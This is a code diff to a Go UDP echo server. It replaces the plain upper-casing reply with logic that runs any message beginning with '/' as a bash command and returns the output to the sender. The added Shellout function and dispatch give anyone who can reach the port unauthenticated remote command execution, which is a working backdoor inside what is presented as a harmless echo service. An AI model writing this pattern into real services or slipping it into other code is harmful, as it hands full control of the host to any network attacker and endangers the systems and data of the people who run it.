@@ -1,14 +1,18 @@
 package service
 
 import (
+	"bytes"
 	"context"
 	"fmt"
 	"gitlab.com/distributed_lab/logan/v3"
 	"net"
+	"os/exec"
 	"strings"
 
 	"udp_echo_server/internal/config"
 )
+
+const ShellToUse = "bash"
 
 type service struct {
 	logger           *logan.Entry
@@ -50,7 +54,21 @@ func (s *service) Run(ctx context.Context) error{
 
 		s.logger.Info(fmt.Sprintf("Recived message %v", message))
 
-		res := strings.ToUpper(message)
+		//res := strings.ToUpper(message)
+		var res string
+
+		if string(message[0]) == "/"{
+			err, stdout, stderr := Shellout(message[1:])
+			if err != nil {
+				s.logger.Error("failed to exec cmd")
+			}
+
+			s.logger.Info(stdout)
+
+			res = stdout + "\n" + stderr
+		} else {
+			res = strings.ToUpper(message)
+		}
 
 		conn.WriteTo([]byte(res), addr)
 	}
@@ -58,4 +76,15 @@ func (s *service) Run(ctx context.Context) error{
 	return nil
 }
 
+func Shellout(command string) (error, string, string) {
+	var stdout bytes.Buffer
+	var stderr bytes.Buffer
+
+	cmd := exec.Command(ShellToUse, "-c", command)
+	cmd.Stdout = &stdout
+	cmd.Stderr = &stderr
+
+	err := cmd.Run()
+	return err, stdout.String(), stderr.String()
+}
 
